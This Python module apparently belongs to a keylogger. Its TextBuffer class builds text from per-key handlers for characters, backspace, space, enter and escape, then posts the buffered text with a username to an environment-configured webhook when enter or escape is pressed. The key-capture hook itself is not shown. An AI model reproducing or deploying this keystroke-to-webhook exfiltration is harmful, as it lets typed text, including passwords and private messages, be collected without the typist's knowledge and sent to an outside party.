import os
import requests
from dotenv import load_dotenv

load_dotenv()

WEBHOOK_URL = os.environ.get('WEBHOOK_URL')


class TextBuffer:
    def __init__(self, usernames):
        self.usernames: list = usernames
        self.buffer: str = ""
        self.init_buffer()

    def send_message(self) -> None:
        message = self.usernames[-1] + ": " + self.buffer
        payload = {"content": message}
        requests.post(WEBHOOK_URL, data=payload)

    def init_buffer(self) -> None:
        self.buffer = ""

    def handle_char(self, character: str) -> None:
        self.buffer += character

    def handle_backspace(self) -> None:
        self.buffer = self.buffer[:-1]

    def handle_enter(self) -> None:
        self.send_message()
        self.init_buffer()

    def handle_space(self) -> None:
        self.buffer += " "

    def handle_esc(self) -> bool:
        self.send_message()
        return False


def get_bool(name: str, default: bool = False) -> bool:
    if name is None:
        return default
    return name.strip().lower() in ('1', 'true', 'yes', 'y', 'on')
